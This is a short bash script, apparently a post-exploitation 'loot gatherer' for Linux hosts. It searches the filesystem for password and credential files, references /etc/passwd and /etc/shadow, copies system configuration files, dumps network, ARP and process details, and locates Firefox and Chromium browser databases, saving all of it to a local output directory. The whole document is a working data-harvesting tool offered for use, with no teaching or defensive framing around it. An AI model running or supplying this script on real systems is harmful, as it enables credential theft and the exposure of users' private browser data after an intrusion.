#!/bin/bash
# loot-gather.sh - Collect evidence and loot
# Usage: ./loot-gather.sh <output_dir>

OUT=${1:-loot-$(date +%Y%m%d-%H%M%S)}

echo "=== Loot Gatherer: $OUT ==="
mkdir -p $OUT

echo "[1/5] Grabbing hashes..."
find / -name "*.lst" -o -name "*.pwd" -o -name "*.pass" 2>/dev/null | head -20 > $OUT/found-creds.txt
ls -la /etc/passwd /etc/shadow 2>/dev/null >> $OUT/found-creds.txt

echo "[2/5] Saving configs..."
cp /etc/hosts $OUT/ 2>/dev/null
cp /etc/resolv.conf $OUT/ 2>/dev/null
ls /etc/*.conf 2>/dev/null | head -10 | xargs -I{} cp {} $OUT/ 2>/dev/null

echo "[3/5] Network info..."
ip addr > $OUT/network.txt
ip route >> $OUT/network.txt
arp -a >> $OUT/network.txt

echo "[4/5] Process list..."
ps aux > $OUT/processes.txt
ls -la /proc/*/exe 2>/dev/null | head -30 >> $OUT/processes.txt

echo "[5/5] Browser data (if accessible)..."
find ~/.mozilla ~/.config/chromium -name "*.db" 2>/dev/null | head -10 >> $OUT/browsers.txt

echo "=== Loot saved to: $OUT ==="
ls -la $OUT